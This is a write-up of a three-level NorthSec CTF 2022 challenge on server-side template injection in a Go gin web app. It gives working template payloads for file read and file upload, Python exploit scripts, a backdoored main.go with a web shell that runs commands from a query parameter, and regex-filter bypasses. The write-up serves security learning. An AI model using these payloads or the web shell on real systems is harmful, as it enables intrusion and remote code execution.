---
title: "[NorthSec CTF 2022] Marketing Email Template"
date: 2022-06-07
draft: false
url: /nsec2022-email-template
---

# Introduction

This is a write-up about a track of 3 flags in NorthSec CTF 2022 around SSTI (Server-Side Template Injection) in Go. The context is that we are auditing an application used to draft marketing emails through a template.

We (Team PolyHx) ended up being the first team to complete the whole track.

# Note

The `main.go` files can be built and ran and during the CTF I was debugging locally most of the time. Need to setup a `templates/` folder containing placeholder `templates/index.html` and `templates/preview.html` beforehand.

```
mkdir templates
echo "Index" > templates/index.html
echo "Preview" > templates/preview.html
go build main.go
./main
```

# Level 1 - Baby Steps

Accessing the website (http://dev.email-template.ctf), we are welcomed with an application that allows us to specify a template for an email which can contain variables like `{{ .title }}`. There is a link to download the source code of the application, which uses the Go language.

In this case, I approached the web application code by first looking into the exposed server routes as there were not that many.

<details>
  <summary>main.go - Level 1</summary>

  ```golang
     1  package main
     2
     3  import (
     4      "os"
     5      "log"
     6      "fmt"
     7      "path"
     8      "errors"
     9      "strings"
    10
    11      "net/http"
    12      "io/ioutil"
    13      "html/template"
    14
    15      "github.com/gin-gonic/gin"
    16  )
    17
    18  type Update struct {
    19      Template string `json:"template" binding:"required"`
    20  }
    21
    22  type MyApp struct {
    23      templateName string
    24  }
    25
    26  func (m *MyApp) ReadFile() ([]byte, error) {
    27      f, err := os.Open(m.templateName)
    28
    29      if err != nil {
    30          files, e := ioutil.ReadDir(path.Dir(m.templateName))
    31
    32          if e != nil {
    33              return []byte{}, e
    34          }
    35
    36          var filenames []string
    37          for _, file := range files {
    38              var filename string = file.Name()
    39              if file.IsDir() {
    40                  filename += " (directory)"
    41              }
    42              filenames = append(filenames, filename)
    43          }
    44
    45          return []byte(fmt.Sprint(err) + "\nPossible files:\n" + strings.Join(filenames[:], "\n")), nil
    46      }
    47
    48      defer func() {
    49          if err = f.Close(); err != nil {
    50              log.Fatal(err)
    51          }
    52      }()
    53
    54      return ioutil.ReadAll(f)
    55  }
    56
    57  func (m *MyApp) SetTemplateName(name string) error {
    58      if name == "" {
    59          return errors.New("TemplateName cannot be nil or empty.")
    60      }
    61
    62      m.templateName = name
    63      return nil
    64  }
    65
    66  func main() {
    67      r := gin.Default()
    68      r.LoadHTMLGlob("templates/*")
    69      r.Static("/assets", "./assets")
    70
    71      r.GET("/", func(c *gin.Context) {
    72          m := MyApp{"templates/index.html"}
    73          content, err := m.ReadFile()
    74
    75          if err != nil {
    76              log.Fatal(err)
    77          }
    78
    79          m.SetTemplateName("templates/preview.html")
    80          preview, err := m.ReadFile()
    81
    82          if err != nil {
    83              log.Fatal(err)
    84          }
    85
    86          tmpl, err := template.New("").Parse(string(content))
    87
    88          if err != nil {
    89              log.Fatal(err)
    90          }
    91
    92          c.Status(http.StatusOK)
    93          err = tmpl.Execute(c.Writer, gin.H{"title":"Test!","template":string(preview),"m":&m})
    94
    95          if err != nil {
    96              log.Fatal(err)
    97          }
    98      })
    99
   100      r.POST("/update", func(c *gin.Context) {
   101          var update Update
   102          var err error
   103
   104          err = c.BindJSON(&update)
   105
   106          if err != nil {
   107              log.Fatal(err)
   108          }
   109
   110          f, err := os.OpenFile("templates/preview.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0664)
   111
   112          if err != nil {
   113              log.Fatal(err)
   114          }
   115
   116          defer f.Close()
   117
   118          if _, err = f.WriteString(update.Template); err != nil {
   119              log.Fatal(err)
   120          }
   121
   122          c.JSON(200, "ok")
   123      })
   124
   125      r.Any("/preview", func(c *gin.Context) {
   126          m := MyApp{"templates/preview.html"}
   127
   128          var title string
   129          if title = c.Query("title"); c.Query("title") == "" {
   130              title = "Test Email"
   131          }
   132
   133          var eventname string
   134          if eventname = c.Query("eventname"); c.Query("eventname") == "" {
   135              eventname = "My-Event-Name"
   136          }
   137
   138          var firstname string
   139          if firstname = c.Query("firstname"); c.Query("firstname") == "" {
   140              firstname = "John"
   141          }
   142
   143          var lastname string
   144          if lastname = c.Query("lastname"); c.Query("lastname") == "" {
   145              lastname = "Smith"
   146          }
   147
   148          var companyname string
   149          if companyname = c.Query("companyname"); c.Query("companyname") == "" {
   150              companyname = "Email Templating Inc."
   151          }
   152
   153          // Fetch all custom tags
   154          var num string
   155          var stop bool = false
   156          var custom string
   157          var customs = map[string]string{}
   158          for i := 1; !stop; i++ {
   159              num = "custom"+string(i+48)
   160              custom = c.Query(num)
   161
   162              if custom == ""{
   163                  stop = true
   164                  break
   165              }
   166              customs[num] = custom
   167          }
   168
   169          // Create the response map
   170          var response map[string]interface{} = gin.H{
   171                  "title":title,
   172                  "eventname":eventname,
   173                  "firstname":firstname,
   174                  "lastname":lastname,
   175                  "companyname":companyname,
   176                  "m":&m,
   177              }
   178
   179          // Merge the custom tags
   180          for key, value := range customs {
   181              response[key] = value
   182          }
   183
   184          content, err := m.ReadFile()
   185
   186          if err != nil {
   187              log.Fatal(err)
   188          }
   189
   190          tmpl, err := template.New("").Parse(string(content))
   191
   192          if err != nil {
   193              log.Fatal(err)
   194          }
   195
   196          c.Status(http.StatusOK)
   197          err = tmpl.Execute(c.Writer, response)
   198
   199          if err != nil {
   200              log.Fatal(err)
   201          }
   202      })
   203
   204      r.Run("127.0.0.1:8000")
   205  }
  ```
</details>


## GET /

This is the landing page, no user input appears to be considered here. It does use a custom struct[ure] called `MyApp` to fetch the contents of a given template.

The struct is composed of only one variable, which is the `templateName` of type `string`. In Go, there is the concept of exported variables and functions. Being exported, means programmers can refer to the respective item directly when outside the package it was declared in. To be considered as exported, variables' and functions' names have to be declared with a capital letter at the beginning.

```golang
MyApp.ReadFile()   // OK, wherever.
MyApp.templateName // Illegal outside "main" package.
```

The code also declares two functions that can be called on a `MyApp` instance.

`SetTemplateName` is pretty much a setter function, to update the instance's `templateName` value.

`ReadFile` is more interesting and has suspicious functionality. It first tries to open a file using the path in the instance's `templateName`. If the file does not exist, it will list all the files and directories present in the directory where `templateName` would be. 

This route then renders the `templates/index.html` with some data (which includes the contents of file `templates/preview.html` )

## POST /update

Using the struct `Update`, the route retrieves the `template` value of the JSON object in the request's body. Then it updates the contents of the file `templates/preview.html` with that value. This means that the file and its content should now be considered a user input. No sanitization appears to be present for it.

## ANY /preview

The `Any` route used here matches all HTTP methods. The route gets a few query parameters from the request which will be used to fill a `response` map variable. The `response` variable will also contain `custom` variables which we will revisit later, and a `m` variable which is the `MyApp` instance used to read the templates.

The `templates/preview.html` file gets read through the `MyApp` instance and the content is parsed as template. The template is then `Execute`d with the variable `response` as its data. The http response will contain the result of executing the template with the data. 

## The Vulnerability

I had never really heard of SSTI research or payloads in Go before. As such, I did a quick search to find existing research and found [one article](https://www.onsecurity.io/blog/go-ssti-method-research/) by Gus Ralph. My main takeaway was that it is possible to call exported functions from the variables that were passed to the template. 

Thankfully in this challenge, the template is provided the `m` variable of type `MyApp` which as we saw contains two exported functions. 

We will use as reference the [documentation](https://pkg.go.dev/text/template) for `text/template`. The following excerpt looks interesting:
```
.Method [Argument...]
	The method can be alone or the last element of a chain but,
	unlike methods in the middle of a chain, it can take arguments.
	The result is the value of calling the method with the
	arguments:
		dot.Method(Argument1, etc.)
```

This means if we put in our template the following content:
```
{{ .m.SetTemplateName "fishinspace" }}
```
After evaluating this template, the `m` instance will have its `templateName` changed. Combining this with `ReadFile`, we now have a gadget to read any file with sufficient permissions. `ReadFile` returns the file's content, so it will get inserted in the render, allowing us to view it. Let's also use a variable instead of hardcoding the name, so we do not have to reupload a template everytime.
```
{{ .m.SetTemplateName .title }}
{{ .m.ReadFile }}
```

We upload this template and then preview it while making sure to use the GET query parameter `title` as our filename. We then get the flag. 
Keep in mind, if the file does not exist, the directory will be listed. This will help us enumerate a few other files later on.
```
GET /preview?title=/flag.txt
```

**FLAG-6f040fad14bea1df66d07d8ccc109924**

# Level 2 - Pass Go and Collect $(id)

We now get access to a second website (http://dev-7fe5c15819a3af65.email-template.ctf). It is similar to the first one, code is provided again.

<details>
  <summary>main.go - Level 2</summary>

  ```golang
     1  package main
     2
     3  import (
     4      "os"
     5      "log"
     6
     7      "net/http"
     8      "io/ioutil"
     9
    10      "github.com/gin-gonic/gin"
    11  )
    12
    13  type Update struct {
    14      Template string `json:"template" binding:"required"`
    15  }
    16
    17  func main() {
    18      r := gin.Default()
    19      r.LoadHTMLGlob("templates/*")
    20      r.Static("/assets", "./assets")
    21
    22      r.GET("/", func(c *gin.Context) {
    23          f, err := os.Open("templates/preview.html")
    24
    25          if err != nil {
    26              log.Fatal(err)
    27          }
    28
    29          defer func() {
    30              if err = f.Close(); err != nil {
    31                  log.Fatal(err)
    32              }
    33          }()
    34
    35          content, err := ioutil.ReadAll(f)
    36
    37          c.HTML(http.StatusOK, "index.html", gin.H{"title":"Test!","template":string(content),"c":c})
    38      })
    39
    40      r.POST("/update", func(c *gin.Context) {
    41          var update Update
    42          var err error
    43
    44          err = c.BindJSON(&update)
    45
    46          if err != nil {
    47              log.Fatal(err)
    48          }
    49
    50          f, err := os.OpenFile("templates/preview.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0664)
    51
    52          if err != nil {
    53              log.Fatal(err)
    54          }
    55
    56          defer f.Close()
    57
    58          if _, err = f.WriteString(update.Template); err != nil {
    59              log.Fatal(err)
    60          }
    61
    62          c.JSON(200, "ok")
    63      })
    64
    65      r.Any("/preview", func(c *gin.Context) {
    66          var title string
    67          if title = c.Query("title"); c.Query("title") == "" {
    68              title = "Test Email"
    69          }
    70
    71          var eventname string
    72          if eventname = c.Query("eventname"); c.Query("eventname") == "" {
    73              eventname = "My-Event-Name"
    74          }
    75
    76          var firstname string
    77          if firstname = c.Query("firstname"); c.Query("firstname") == "" {
    78              firstname = "John"
    79          }
    80
    81          var lastname string
    82          if lastname = c.Query("lastname"); c.Query("lastname") == "" {
    83              lastname = "Smith"
    84          }
    85
    86          var companyname string
    87          if companyname = c.Query("companyname"); c.Query("companyname") == "" {
    88              companyname = "Email Templating Inc."
    89          }
    90
    91          // Fetch all custom tags
    92          var num string
    93          var stop bool = false
    94          var custom string
    95          var customs = map[string]string{}
    96          for i := 1; !stop; i++ {
    97              num = "custom"+string(i+48)
    98              custom = c.Query(num)
    99
   100              if custom == ""{
   101                  stop = true
   102                  break
   103              }
   104              customs[num] = custom
   105          }
   106
   107          // Create the response map
   108          var response map[string]interface{} = gin.H{
   109                  "title":title,
   110                  "eventname":eventname,
   111                  "firstname":firstname,
   112                  "lastname":lastname,
   113                  "companyname":companyname,
   114                  "c":c,
   115              }
   116
   117          // Merge the custom tags
   118          for key, value := range customs {
   119              response[key] = value
   120          }
   121
   122          c.HTML(http.StatusOK,
   123              "preview.html",
   124              response,
   125          )
   126      })
   127
   128      r.Run("127.0.0.1:8000")
   129  }
  ```
</details>

This time, the `MyApp` custom struct is gone. Instead of the `m` variable, we notice the `c` variable of type  `*gin.Context` being passed to the template. This seems like our best bet, so let's check the type and its exported fields. The relevant [documentation](https://pkg.go.dev/github.com/gin-gonic/gin#Context) will be used along its [source code](https://github.com/gin-gonic/gin/blob/master/context.go).

Looking at the documentation for type `Context`, the following fields are exported (not including functions):
```golang
type Context struct {
	Request *http.Request
	Writer  ResponseWriter

	Params Params

	// Keys is a key/value pair exclusively for the context of each request.
	Keys map[string]any

	// Errors is a list of errors attached to all the handlers/middlewares who used this context.
	Errors errorMsgs

	// Accepted defines a list of manually accepted formats for content negotiation.
	Accepted []string
	// contains filtered or unexported fields
}
```

Since we have access to `Context.Request`, one could also look into the exported fields of the type `http.Request`. Most of my time was spent on trying to find suitable functions.

We are looking for any path that would allows us to read a file. A function of `Context` grabbed my attention, namely the `FileAttachment` function:

```golang
// FileAttachment writes the specified file into the body stream in an efficient way
// On the client side, the file will typically be downloaded with the given filename
func (c *Context) FileAttachment(filepath, filename string) {
	if isASCII(filename) {
		c.Writer.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
	} else {
		c.Writer.Header().Set("Content-Disposition", `attachment; filename*=UTF-8''`+url.QueryEscape(filename))
	}
	http.ServeFile(c.Writer, c.Request, filepath)
}
```

Let's upload the following template:
```
{{ .c.FileAttachment "/flag.txt" "exfil" }}
```

Previewing our template, we see the following error in our local server's logs:
```
template: preview.html:1:5: executing "preview.html" at <.c.FileAttachment>: can't call method/function "FileAttachment" with 0 results
```

After some troubleshooting, I end up reading the crucial parts of the documentation of `text/template` regarding calling methods: 
```
The result is the value of invoking the method with dot as the
receiver, dot.Method(). Such a method must have one return value (of
any type) or two return values, the second of which is an error.
If it has two and the returned error is non-nil, execution terminates
and an error is returned to the caller as the value of Execute.
```

`FileAttachment` has no return value, thus we get an error. We need to explore more and now we know the following requirements:
1. The function must have one return value or two if the second one is an `error`
2. The function must perform some "exploitable" action.
3. The function must use argument types we can provide since we cannot create arbitrary types from a template.

## The Vulnerability 

After a lot of trial and error, one function looked interesting:

```golang
// SaveUploadedFile uploads the form file to specific dst.
func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error {
	src, err := file.Open()
	if err != nil {
		return err
	}
	defer src.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, src)
	return err
}
```

`SaveUploadedFile` fills the first and second requirements as it returns one value and appears to allow arbitrary file upload. As for the third requirement, there is no way to declare a `*multipart.FileHeader` object from a template. Would there be?

Enters the `FormFile` function:

```golang
// FormFile returns the first file for the provided form key.
func (c *Context) FormFile(name string) (*multipart.FileHeader, error) {
	if c.Request.MultipartForm == nil {
		if err := c.Request.ParseMultipartForm(c.engine.MaxMultipartMemory); err != nil {
			return nil, err
		}
	}
	f, fh, err := c.Request.FormFile(name)
	if err != nil {
		return nil, err
	}
	f.Close()
	return fh, err
}
```

The `FormFile` function fulfills the first requirement due to returning a `*multipart.FileHeader` and an `error` as second value. It also fulfills the third requirement as we can easily pass a `string` to the function. As for the second requirement, this function fetches a named file from our multipart form request which we control the contents of. Since this returns the exact type expected by `SaveUploadedFile`, this is the perfect gadget combination to achieve arbitrary file upload!

```
{{ .c.SaveUploadedFile (.c.FormFile "fish") .title }}
```

Testing locally, it works. We preview by sending a multipart form request which contains a file with the form input name `fish` and a URL query parameter `title` containg a file path. Good thing for us that the parentheses will be considered as only the first return value and not include the error.

```python
import requests

URL = "http://dev-7fe5c15819a3af65.email-template.ctf"
payload = {
    "template": """
{{ .c.SaveUploadedFile (.c.FormFile "fish") .title }}
"""
}

files = {'fish': open("afile", "r")}

r = requests.post(URL+"/update", json=payload)
print(r.status_code)
print(r.text)

r1 = requests.post(URL+"/preview?title=/example/file.txt", files=files)
print(r.status_code)
print(r.text)
```

But... then what? This does not allow us to read files.

## The Exploitation

At this point, I could not find any other useful and usable function. We need to find a way to push this further. I did not mention it, but on the first level I explored the filesystem of the challenge server while trying to find the flag. I noticed a few things.

The root `/` directory had `/app/` which contains the challenge's code. The root also contained `/app.bk/` which appeared to be a copy/backup of `/app/`. 

Since level 1, the challenge offered the possibility of resetting the challenge due to concerns of being hard locked. That could be done by visiting the route `/reset`. I hadn't noticed that route in the Go code, so it must be implemented in some other way. When exploring the filesystem, I found two PHP scripts which Apache pointed at when we visited `GET /reset` and `GET /source`. 

The `reset.php` script took care of replacing the `/app/` directory with a clean copy of the backup and restarting the challenge service. 

<details>
  <summary>/var/www/html/reset.php - Level 1</summary>

  ```php
     1  <?php
     2          system("sudo /usr/bin/systemctl stop email-template");
     3          system("/usr/bin/rm -rf /app/*");
     4          system("/usr/bin/cp -r /app.bk/* /app/");
     5          system("sudo /usr/bin/chown -R www-data: /app/");
     6          system("sudo /usr/bin/systemctl start email-template");
     7  ?>
     8  <!DOCTYPE html>
     9  <html>
    10  <head>
    11          <meta charset="utf-8">
    12          <meta http-equiv="refresh" content="5; url='/'">
    13          <title>Reset</title>
    14  </head>
    15  <body>
    16          Resetting... Autoredirect after 5 seconds
    17  </body>
    18  </html>
  ```
</details>

The `source.php` script took care of showing us the contents of `main.go`. This functionality also wasnt seen in the Go code, so now it makes sense now.

My first train of thought was to try and backdoor the backup of `main.go` and reset so that we get setup a backdoored version of the challenge. This did not work as we did not have permissions to write in `/app.bk/`. Putting a PHP file in `/var/www/html/` was also not usable, due to the proxy only taking `reset` and `source`. 

We could try to backdoor `/app/main.go` (which we do have permissions for) but this wouldn't have any changes as the program is already loaded in memory.

Since the start, I had  experienced a few times where the server would crash and a message would appear that it is currently restarting, sometimes it would be in a restart loop and that is when a reset would be needed. Usually when a Go source is compiled, it is built into an `.exe`, but I did not see one in the `/app/` directory. Another way to run Go code is through a `go run main.go` command which does not create a `.exe` file. Therefore, I made a guess that the service, on restart, would perform a `go run main.go` command which would run it as it is then.

To recap:
- We have arbitrary file upload.
- We can overwrite `/app/main.go`
- We can maybe get our modified version ran if the service restarts (without a full reset).

One way to crash the server would be to reach one of the many calls to `log.Fatal` which is described as `Fatal is equivalent to Print() followed by a call to os.Exit(1)`. The one I ended up reaching was due to an error after calling `c.BindJSON(&update)` on line 47. To reach it, all we need to do is not send a JSON payload with `template` in it. An error will occur and the `log.Fatal` will be reached, terminating the server.

In my backdoored `main.go`, I implemented a very basic web shell on the route `/`.

```golang
r.GET("/", func(c *gin.Context) {
	cmd := c.DefaultQuery("fish", "id")
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		c.String(200, fmt.Sprintf("%s\n", err))
	} else {
		c.String(200, fmt.Sprintf("%s\n", out))
	}
})
```

```python
import requests

URL = "http://dev-7fe5c15819a3af65.email-template.ctf"

payload = {
    "template": """
{{ .c.SaveUploadedFile (.c.FormFile "fish") "/app/main.go" }}
"""
}

files = {'fish': open("backdoor.go", "r")}

r = requests.post(URL+"/update", json=payload) # Updates the preview template.
print(r.status_code)
print(r.text)

r = requests.post(URL+"/preview?", files=files) # Trigger the rendering of our template.
print(r.status_code)
print(r.text)

r = requests.post(URL+"/update") # Crashes server, which restarts the service.
print(r.status_code)
print(r.text)

```

This ended up working although I was not too confident. Right after the CTF, I realized I could have looked into the definition of the service. Later, another player confirmed that the file `/etc/systemd/system/email-template.service` showed all the necessary information to be confident in this attack. Next time, I will be more careful as that service's name was mentioned in the `reset.php` script and I should have taken a look.
```
[Unit]
Description=Email Template

[Service]
Type=simple
User=www-data
Group=www-data
Restart=always
RestartSec=5s
WorkingDirectory=/app/
ExecStart=/usr/local/go/bin/go run /app/main.go

[Install]
WantedBy=multi-user.target
```

With our webshell it is trivial to get the flag.

**FLAG-527afbab4c2ae6ed15d6134328b8bc05**

# Level 3 - Just a Regular Bypass

We now get access to a second website (http://dev-092f50226ea22197.email-template.ctf). It is similar to the second one, but this time with some input filters. Code is provided again.

<details>
  <summary>main.go - Level 3</summary>

  ```golang
     1  package main
     2
     3  import (
     4      "os"
     5      "log"
     6      "regexp"
     7      "strings"
     8
     9      "net/http"
    10      "io/ioutil"
    11
    12      "github.com/gin-gonic/gin"
    13  )
    14
    15  type Update struct {
    16      Template string `json:"template" binding:"required"`
    17  }
    18
    19  func filter(template string) (bool, string) {
    20      r1, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(["\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`)
    21      r2, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`)
    22      r3, _ := regexp.Compile(`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`)
    23
    24      // Filter everything from Context, and double quotes, equal, backtick, pipe and parenthesis to avoid bypass as well.
    25      i := r1.FindStringSubmatch(template)
    26      if len(i) > 0  {
    27          return false, ""
    28      }
    29
    30      // Make sure the default variables can't be used to bypass filter.
    31      if strings.Contains(template, ".title")  ||
    32          strings.Contains(template, ".eventname") ||
    33          strings.Contains(template, ".firstname") ||
    34          strings.Contains(template, ".lastname") ||
    35          strings.Contains(template, ".companyname") ||
    36          strings.Contains(template, ".custom") {
    37
    38
    39          j := r2.FindAllString(template, -1)
    40          if len(j) > 0  {
    41              for _, v := range j {
    42                  k := r3.FindStringSubmatch(v)
    43                  if len(k) == 0{
    44                      l := r2.FindStringSubmatch(v)
    45                      return false, "Can only use " + l[2] + " like the following {{ " + l[2] + " }}"
    46                  }
    47              }
    48          }
    49      }
    50
    51      return true, ""
    52  }
    53
    54  func main() {
    55      r := gin.Default()
    56      r.LoadHTMLGlob("templates/*")
    57      r.Static("/assets", "./assets")
    58
    59      r.GET("/", func(c *gin.Context) {
    60          f, err := os.Open("templates/preview.html")
    61
    62          if err != nil {
    63              log.Fatal(err)
    64          }
    65
    66          defer func() {
    67              if err = f.Close(); err != nil {
    68                  log.Fatal(err)
    69              }
    70          }()
    71
    72          content, err := ioutil.ReadAll(f)
    73
    74          c.HTML(http.StatusOK, "index.html", gin.H{"title":"Test!","template":string(content),"c":c})
    75      })
    76
    77      r.POST("/update", func(c *gin.Context) {
    78          var update Update
    79          var err error
    80
    81          err = c.BindJSON(&update)
    82
    83          if err != nil {
    84              log.Fatal(err)
    85          }
    86
    87          if b, err := filter(update.Template); !b {
    88              c.JSON(400, err)
    89          } else {
    90              f, err := os.OpenFile("templates/preview.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0664)
    91
    92              if err != nil {
    93                  log.Fatal(err)
    94              }
    95
    96              defer f.Close()
    97
    98              if _, err = f.WriteString(update.Template); err != nil {
    99                  log.Fatal(err)
   100              }
   101
   102              c.JSON(200, "ok")
   103          }
   104      })
   105
   106      r.Any("/preview", func(c *gin.Context) {
   107          var title string
   108          if title = c.Query("title"); c.Query("title") == "" {
   109              title = "Test Email"
   110          }
   111
   112          var eventname string
   113          if eventname = c.Query("eventname"); c.Query("eventname") == "" {
   114              eventname = "My-Event-Name"
   115          }
   116
   117          var firstname string
   118          if firstname = c.Query("firstname"); c.Query("firstname") == "" {
   119              firstname = "John"
   120          }
   121
   122          var lastname string
   123          if lastname = c.Query("lastname"); c.Query("lastname") == "" {
   124              lastname = "Smith"
   125          }
   126
   127          var companyname string
   128          if companyname = c.Query("companyname"); c.Query("companyname") == "" {
   129              companyname = "Email Templating Inc."
   130          }
   131
   132          // Fetch all custom tags
   133          var num string
   134          var stop bool = false
   135          var custom string
   136          var customs = map[string]string{}
   137          for i := 1; !stop; i++ {
   138              num = "custom"+string(i+48)
   139              custom = c.Query(num)
   140
   141              if custom == ""{
   142                  stop = true
   143                  break
   144              }
   145              customs[num] = custom
   146          }
   147
   148          // Create the response map
   149          var response map[string]interface{} = gin.H{
   150                  "title":title,
   151                  "eventname":eventname,
   152                  "firstname":firstname,
   153                  "lastname":lastname,
   154                  "companyname":companyname,
   155                  "c":c,
   156              }
   157
   158          // Merge the custom tags
   159          for key, value := range customs {
   160              response[key] = value
   161          }
   162
   163          c.HTML(http.StatusOK,
   164              "preview.html",
   165              response,
   166          )
   167      })
   168
   169      r.Run("127.0.0.1:8000")
   170  }
  ```
</details>

The main difference with the second level is that a `filter` function is called before updating the `templates/preview.html` file.

Let's look at the three specific regular expressions used to check our template input.
```golang
r1, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(["\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`)
r2, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`)
r3, _ := regexp.Compile(`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`)
```

I like to use [Debuggex](https://www.debuggex.com/) to help me visualize some regular expressions. Here is what the first regex is checking:

![](/25f349ed-948e-48eb-969b-3cdca74b7b0e/debuggex-r1.png)

If we test it with our level 2 template as input:

```
{{ .c.SaveUploadedFile (.c.FormFile "fish") "/app/main.go" }}
```

It will get matched due to the parentheses and the quotes. I quickly noticed that, after a quote or parenthesis, the regex is looking any character that is not `}`. So what if we somehow put `}` between before the end? 

```
{{ .c.SaveUploadedFile (.c.FormFile "}") "/app/main.go" }}
```

Turns out, `}` is a perfectly fine form input name for the server and it does bypass the filter and the other two regexes do not even come into play as the payload does not contain those variables.

**FLAG-46dd90020d9b9d1270a8ee4be745405e**

## Alternative

Early on, since level 1, I had examined the code related to `customs`
- Level 1 - Line 153-167
- Level 2 - Line 91-105
- Level 3 - Line 132-146 

What I noticed was the odd way it allowed us to provide consecutive custom variables. 
It starts with the first custom at "index" 1, which ends up being ASCII code 48+1, which is `custom1`. So if `custom1` exists, it will then check `custom2` (ASCII code 48+2 = "2"). It does not stop until the next `customX` is not defined. So if we define enough customs in our query parameters, we will end up with the following list:
```
custom1
custom2
custom3
custom4
custom5
custom6
custom7
custom8
custom9
custom:
custom;
custom<
custom=
custom>
custom?
custom@
customA
customB
customC
```

Now, if you check the second and third regular expressions, you will notice that they only check for `.custom[0-9]+` which only accounts for the ones ending with a digit. 
Thus, another unintended solve, would be to use the following template:

```
{{ with .c.FormFile .customA }}
{{ .c.SaveUploadedFile . .customB }}
{{ end }}
```

After a bit of research, it turns out that a `*multipart.FileHeader` contains an exported field `Filename` and in our case, it takes the filename provided by the form input. We can remove the need for a second custom.

```python
import requests

URL = "http://dev-092f50226ea22197.email-template.ctf"

payload = {
    "template": """
{{ with .c.FormFile .customA }}
{{ $.c.SaveUploadedFile . .Filename }}
{{ end }}
"""
}

# Form Input Name: fish
# Filename: /app/main.go
files = {'fish': ("/app/main.go", open("backdoor.go","r"))}

r = requests.post(URL+"/update", json=payload)
print(r.status_code)
print(r.text)

r = requests.post(URL+"/preview?custom1=a&custom2=a&custom3=a&custom4=a&custom5=a&custom6=a&custom7=a&custom8=a&custom9=a&custom%3A=a&custom%3B=a&custom%3C=a&custom%3D=a&custom%3E=a&custom%3F=a&custom%40=a&customA=fish", files=files)
print(r.status_code)
print(r.text)
```

After solving the third level, the challenge author informed me that this was unintended. Some time after the CTF, the author reached out to me to test a modified regular expression and I found that some parts of it could be bypassed due missing regex flag `(?s)`. This is due to the default configuration not matching `.` with newline characters. 

# Conclusion

The third level showcases how hard it can be to get regex right on your first try. I did not write about the intended way as the challenge will be hosted on RingZer0 CTF in the future and I will leave something to play with. 

It was a good learning experience to explore SSTI in Go as I did not know how it could occur. It does seem to require many conditions to be exploitable due to way templates are designed in Go, but that's the fun of CTFs to create those kind of situations!

I really enjoyed this challenge due to having to find gadgets within a known open-source library and due to getting practice auditing code which was a fun throwback to my OSWE certification.  

The challenge author shared with me that they decided to look into vulnerabilities that can happen in Go after experiencing a challenge I designed and published on RingZer0 CTF with their help. That is how this SSTI challenge came to be. If you are curious, you can try my web challenge `Lotto 8/33` on [RingZer0 CTF](https://ringzer0ctf.com/).

Many thanks to the challenge author **Marc Olivier Bergeron (MarcoB#1204)**